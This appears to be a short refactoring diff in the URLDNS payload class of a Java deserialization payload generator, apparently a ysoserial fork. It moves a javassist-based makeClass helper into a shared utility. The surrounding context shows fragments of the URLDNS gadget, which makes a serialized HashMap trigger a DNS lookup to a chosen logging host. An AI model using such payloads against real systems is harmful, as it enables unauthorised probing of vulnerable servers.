@@ -6,10 +6,10 @@ import java.net.URL;
 import java.util.LinkedList;
 import java.util.List;
 
-import javassist.ClassPool;
-import javassist.CtClass;
 import org.su18.ysuserial.payloads.annotation.Authors;
 import org.su18.ysuserial.payloads.annotation.Dependencies;
+
+import static org.su18.ysuserial.payloads.util.Utils.makeClass;
 
 
 /**
@@ -94,14 +94,6 @@ public class URLDNS implements ObjectPayload<Object> {
 		hashMap.put(url, clazz);
 		f.set(url, Integer.valueOf(-1));
 		return hashMap;
-	}
-
-	public static Class makeClass(String clazzName) throws Exception {
-		ClassPool classPool = ClassPool.getDefault();
-		CtClass   ctClass   = classPool.makeClass(clazzName);
-		Class     clazz     = ctClass.toClass();
-		ctClass.defrost();
-		return clazz;
 	}
 
 	public static void setList(String clazzName, String dnsLog) throws Exception {
